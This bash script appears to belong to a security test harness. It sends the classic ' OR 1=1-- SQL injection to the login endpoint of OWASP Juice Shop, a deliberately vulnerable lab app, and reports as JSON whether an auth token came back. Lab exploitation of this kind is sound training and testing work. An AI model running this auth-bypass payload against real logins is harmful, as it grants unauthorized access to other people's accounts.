#!/usr/bin/env bash
# Pre-staged primitive: OWASP Juice Shop SQL injection (genuine http-juice).
#
# STANDARD TOOLING ONLY — a curl courier around Juice Shop's well-known login SQLi
# (' OR 1=1--). No novel exploit is authored. Prints EXACTLY ONE JSON line:
#     {"reached_and_executed": <bool>, "unauthorized_access": <bool>}
# reached = the REST API answered; access = the SQLi returned an authenticated token.
#
# Usage: juice_sqli.sh <host> <port> <path>   (scoped to 172.31.66.0/24)
set -uo pipefail

HOST="${1:?host}"; PORT="${2:?port}"; PATH_="${3:-/}"
BASE="http://${HOST}:${PORT}"

emit() { printf '{"reached_and_executed": %s, "unauthorized_access": %s}\n' "$1" "$2"; }

# 1. Reach the REST surface.
if ! curl -s -m 15 -o /dev/null "${BASE}${PATH_}"; then emit false false; exit 0; fi

# 2. Standard auth-bypass SQLi at the login endpoint; success -> JSON auth token.
OUT="$(curl -s -m 20 -H 'Content-Type: application/json' \
  --data '{"email":"'"'"' OR 1=1--","password":"x"}' \
  "${BASE}/rest/user/login" 2>/dev/null)"

if [ -z "$OUT" ]; then emit false false; exit 0; fi
if printf '%s' "$OUT" | grep -Eq '"(token|authentication)"'; then emit true true; else emit true false; fi
